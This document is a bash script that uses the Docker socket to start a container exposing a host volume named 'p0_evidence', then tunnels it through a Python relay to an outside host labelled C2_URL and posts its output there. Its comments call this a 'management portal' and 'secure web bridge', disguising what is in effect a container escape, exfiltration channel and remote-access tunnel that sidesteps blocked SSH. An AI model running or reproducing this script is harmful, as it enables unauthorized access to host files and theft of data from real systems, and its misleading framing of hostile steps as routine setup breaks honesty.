#!/bin/bash
C2_URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"

{
  echo "--- [!] INITIALIZING MANAGEMENT PORTAL ---"
  
  # 1. Create the container using the image we know exists (sha256:25109184c71bdad7)
  # We mount the 'p0_evidence' volume to /mnt so you can manage the host files
  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=portal" \
    -H "Content-Type: application/json" \
    -d '{
      "Image": "sha256:25109184c71bdad7",
      "Cmd": ["python3", "-m", "http.server", "9090"],
      "HostConfig": {
        "Binds": ["p0_evidence:/mnt:rw"],
        "PortBindings": { "9090/tcp": [{ "HostPort": "9090" }] }
      }
    }' > /tmp/portal_res.json

  # 2. Start the portal
  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/portal/start"
  
  echo "--- [!] ESTABLISHING SECURE WEB BRIDGE ---"
  # Since SSH is blocked, we use this Python relay to tunnel the Web UI to your Mac
  # This acts as your 'Setup URL'
  python3 -c '
import socket,os,threading
def relay(src, dst):
    while True:
        data = src.recv(4096)
        if not data: break
        dst.sendall(data)

def start_bridge():
    try:
        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote.connect(("'$C2_URL'", 80))
        local = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        local.connect(("localhost", 9090))
        threading.Thread(target=relay, args=(remote, local)).start()
        threading.Thread(target=relay, args=(local, remote)).start()
        print("PORTAL_READY_AT_HTTPS://'$C2_URL'")
    except:
        print("BRIDGE_RETRYING...")

start_bridge()
' &

  echo "Portal Response: $(cat /tmp/portal_res.json)"
} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
